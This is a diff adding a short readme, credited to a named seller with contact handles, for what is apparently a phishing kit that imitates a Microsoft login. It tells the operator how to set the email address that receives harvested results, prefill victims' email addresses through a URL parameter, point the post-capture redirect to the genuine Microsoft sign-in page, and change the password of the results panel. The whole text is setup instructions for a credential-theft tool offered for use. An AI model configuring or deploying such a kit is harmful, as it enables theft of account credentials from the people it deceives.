@@ -1,0 +1,16 @@
+// THIS SCRIPT CODED BY TOPFUD.com
+// Skype : TOPFUD@hotmail.com ,, live:.cid.f3ca894e49395bbe
+// ICQ : 624088694
+
+
+change ur email from login.php line 7 $recipient = 'abbb@gmail.com'; // Put your email address here
+
+
+for auto email index.php?email=
+
+
+to change redirect from include/src/fed.js line number  56 
+window.location.href = 'https://login.microsoftonline.com/'; //Will take you to redirect.
+
+
+to change password panel results go to panel/config.php line number 3 $pass = '12345'; /// change panel pass here
